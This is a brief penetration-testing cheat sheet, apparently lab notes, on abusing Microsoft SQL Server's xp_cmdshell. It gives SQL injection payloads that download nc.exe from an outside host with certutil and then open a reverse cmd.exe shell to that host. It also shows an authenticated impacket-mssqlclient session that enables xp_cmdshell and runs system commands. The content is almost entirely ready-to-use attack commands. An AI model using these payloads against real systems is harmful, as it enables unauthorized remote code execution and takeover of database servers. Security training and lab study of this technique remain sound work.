# MSSQL xp_cmd_shell

---

## Manual SQLi to upload NC.exe

```
';EXECUTE xp_cmdshell 'certutil -urlcache -f http://192.168.45.175/nc.exe C:\Windows\Temp\nc.exe';--
```

```
';EXEC xp_cmdshell "c:/windows/temp/nc.exe 192.168.45.175 443 -e cmd.exe";-
```


```

```


## Authenticated

```
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
```

After configuring and enabling xp_cmdshell, we can execute system commands of the current user on the target system.

```
SQL> EXECUTE xp_cmdshell 'whoami';
output

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

nt service\mssql$sqlexpress

NULL
```

